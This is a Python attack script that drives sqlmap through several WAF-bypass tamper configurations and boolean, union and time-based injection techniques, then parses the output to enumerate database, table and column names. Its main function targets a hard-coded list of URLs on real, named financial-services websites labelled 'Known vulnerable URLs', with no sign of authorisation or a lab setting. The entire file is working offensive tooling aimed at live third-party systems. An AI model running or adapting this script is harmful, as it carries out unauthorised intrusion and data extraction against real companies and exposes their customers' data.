#!/usr/bin/env python3

import subprocess
import json
import re
import time

def extract_database_with_bypass(url):
    """Extract database info with WAF bypass techniques"""
    print(f"[+] Extracting from {url} with bypass techniques...")
    
    # Try multiple SQLMap configurations with different bypass techniques
    configs = [
        {
            'name': 'WAF Bypass 1',
            'cmd': [
                'sqlmap', '-u', url, '--batch', '--random-agent',
                '--level=5', '--risk=3', '--timeout=60',
                '--tamper=space2comment,charencode,randomcase,between',
                '--technique=B', '--dbs', '--tables', '--columns',
                '--threads=5'
            ]
        },
        {
            'name': 'WAF Bypass 2', 
            'cmd': [
                'sqlmap', '-u', url, '--batch', '--random-agent',
                '--level=3', '--risk=2', '--timeout=90',
                '--tamper=space2plus,charunicodeencode,unionalltounion',
                '--technique=U', '--dbs', '--tables', '--columns',
                '--threads=3'
            ]
        },
        {
            'name': 'Time-based',
            'cmd': [
                'sqlmap', '-u', url, '--batch', '--random-agent',
                '--level=2', '--risk=2', '--timeout=120',
                '--technique=T', '--dbs', '--tables', '--columns',
                '--time-sec=10'
            ]
        }
    ]
    
    for config in configs:
        try:
            print(f"  [+] Trying {config['name']}...")
            result = subprocess.run(config['cmd'], capture_output=True, text=True, timeout=300)
            
            # Check if we got database information
            databases = extract_databases(result.stdout)
            tables = extract_tables(result.stdout)
            columns = extract_columns(result.stdout)
            
            if databases or tables or columns:
                return {
                    'url': url,
                    'method': config['name'],
                    'databases': databases,
                    'tables': tables,
                    'columns': columns,
                    'raw_output': result.stdout[:1000]
                }
                
        except subprocess.TimeoutExpired:
            print(f"    [-] Timeout for {config['name']}")
        except Exception as e:
            print(f"    [-] Error for {config['name']}: {e}")
    
    return None

def extract_databases(output):
    """Extract database names"""
    databases = []
    patterns = [
        r'available databases \[(\d+)\]:(.*?)(?=\n\[|\nback-end|$)',
        r'Database: ([a-zA-Z_][a-zA-Z0-9_]*)',
        r'current database: \'([^\']+)\'',
        r'back-end DBMS: .* database \'([^\']+)\''
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
        for match in matches:
            if isinstance(match, tuple):
                if len(match) > 1:
                    # Parse list format
                    db_list = match[1].strip()
                    for db in re.findall(r'([a-zA-Z_][a-zA-Z0-9_]*)', db_list):
                        databases.append(db)
                else:
                    databases.append(match[0])
            else:
                databases.append(match)
    
    return list(set([db for db in databases if db and len(db) > 1]))

def extract_tables(output):
    """Extract table names"""
    tables = []
    patterns = [
        r'Database: [a-zA-Z_][a-zA-Z0-9_]*\n\[(\d+) tables?\]:(.*?)(?=\n\[|\nDatabase:|$)',
        r'Table: ([a-zA-Z_][a-zA-Z0-9_]*)',
        r'table \'([a-zA-Z_][a-zA-Z0-9_]*)\''
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
        for match in matches:
            if isinstance(match, tuple):
                if len(match) > 1:
                    # Parse table list
                    table_list = match[1].strip()
                    for table in re.findall(r'([a-zA-Z_][a-zA-Z0-9_]*)', table_list):
                        tables.append(table)
                else:
                    tables.append(match[0])
            else:
                tables.append(match)
    
    return list(set([table for table in tables if table and len(table) > 1]))

def extract_columns(output):
    """Extract column names"""
    columns = []
    patterns = [
        r'Table: [a-zA-Z_][a-zA-Z0-9_]*\n\[(\d+) columns?\]:(.*?)(?=\n\[|\nTable:|$)',
        r'Column: ([a-zA-Z_][a-zA-Z0-9_]*)',
        r'column \'([a-zA-Z_][a-zA-Z0-9_]*)\''
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
        for match in matches:
            if isinstance(match, tuple):
                if len(match) > 1:
                    # Parse column list
                    col_list = match[1].strip()
                    for col in re.findall(r'([a-zA-Z_][a-zA-Z0-9_]*)', col_list):
                        columns.append(col)
                else:
                    columns.append(match[0])
            else:
                columns.append(match)
    
    return list(set([col for col in columns if col and len(col) > 1]))

def main():
    # Known vulnerable URLs
    vulnerable_urls = [
        'https://www.acorns.com/learn/search/?q=invest',
        'https://www.acorns.com/learn/?page=3', 
        'https://www.acorns.com/learn/search/?p=3&q=invest',
        'https://www.acorns.com/support/search/?q=password',
        'https://www.acorns.com/learn/kiersten-schmidt/?page=3',
        'https://www.acorns.com/learn/borrowing/?page=3',
        'https://www.gohenry.com/us/terms-and-conditions/?q=test'
    ]
    
    successful_extractions = []
    
    print("=== Focused Database Extraction ===")
    
    for i, url in enumerate(vulnerable_urls):
        if len(successful_extractions) >= 5:
            break
            
        print(f"\n[{i+1}/{len(vulnerable_urls)}] Processing: {url}")
        
        result = extract_database_with_bypass(url)
        if result:
            successful_extractions.append(result)
            print(f"[!] SUCCESS: Found {len(result['databases'])} DBs, {len(result['tables'])} tables, {len(result['columns'])} columns")
        else:
            print(f"[-] No extraction possible for this URL")
    
    # Save results
    with open('focused_extraction_results.json', 'w') as f:
        json.dump(successful_extractions, f, indent=2)
    
    # Create summary
    print(f"\n=== EXTRACTION SUMMARY ===")
    print(f"Successfully extracted from {len(successful_extractions)} URLs:")
    
    for i, result in enumerate(successful_extractions, 1):
        print(f"\n{i}. {result['url']}")
        print(f"   Method: {result['method']}")
        print(f"   Databases ({len(result['databases'])}): {', '.join(result['databases'])}")
        print(f"   Tables ({len(result['tables'])}): {', '.join(result['tables'][:10])}{'...' if len(result['tables']) > 10 else ''}")
        print(f"   Columns ({len(result['columns'])}): {', '.join(result['columns'][:10])}{'...' if len(result['columns']) > 10 else ''}")

if __name__ == "__main__":
    main()
